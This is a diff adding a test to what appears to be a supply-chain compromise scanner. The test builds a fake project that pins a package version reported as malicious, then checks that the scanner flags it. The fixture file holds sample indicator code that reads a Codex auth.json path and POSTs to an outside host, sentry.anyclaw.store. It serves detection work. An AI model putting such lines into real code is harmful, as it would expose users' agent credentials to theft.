@@ -280,6 +280,41 @@ try {
   fs.rmSync(tmpRedHatRoot, { recursive: true, force: true });
 }
 
+const tmpCodexUiRoot = fs.mkdtempSync(path.join(__dirname, "tmp-codexui-"));
+try {
+  fs.writeFileSync(
+    path.join(tmpCodexUiRoot, "package.json"),
+    JSON.stringify({ dependencies: { "codexui-android": "0.1.125" } }, null, 2)
+  );
+  fs.writeFileSync(
+    path.join(tmpCodexUiRoot, "package-lock.json"),
+    [
+      "node_modules/codexui-android:",
+      "  version: 0.1.125",
+      "  resolved: https://registry.npmjs.org/codexui-android/-/codexui-android-0.1.125.tgz"
+    ].join("\n")
+  );
+  fs.writeFileSync(
+    path.join(tmpCodexUiRoot, "incident-note.js"),
+    [
+      "const codexHome = process.env.CODEX_HOME || '~/.codex';",
+      "const authPath = `${codexHome}/auth.json`;",
+      "const key = 'anyclaw2026';",
+      "fetch('https://sentry.anyclaw.store/startlog', { method: 'POST' });",
+      "// OpenClaw Codex Claude AI Agent gptos.intelligence.assistant app.anyclaw. rootfs.tar.zst.bin anyclaw://auth/codex-callback"
+    ].join("\n")
+  );
+  const codexUiCompromised = scanTarget(tmpCodexUiRoot);
+  assert.strictEqual(codexUiCompromised.risk, "likely-exposed");
+  assert(codexUiCompromised.findings.some((finding) => finding.type === "known-bad-requested-version"));
+  assert(codexUiCompromised.findings.some((finding) => finding.type === "known-bad-lockfile-version"));
+  assert(codexUiCompromised.findings.some((finding) => finding.type === "network-indicator" && finding.message.includes("sentry.anyclaw.store")));
+  assert(codexUiCompromised.findings.some((finding) => finding.type === "campaign-indicator" && finding.message.includes("anyclaw2026")));
+  assert(codexUiCompromised.findings.some((finding) => finding.type === "package-review-prompt" && finding.message.includes("Codex token-theft")));
+} finally {
+  fs.rmSync(tmpCodexUiRoot, { recursive: true, force: true });
+}
+
 const tmpAntvRoot = fs.mkdtempSync(path.join(__dirname, "tmp-antv-"));
 try {
   fs.writeFileSync(
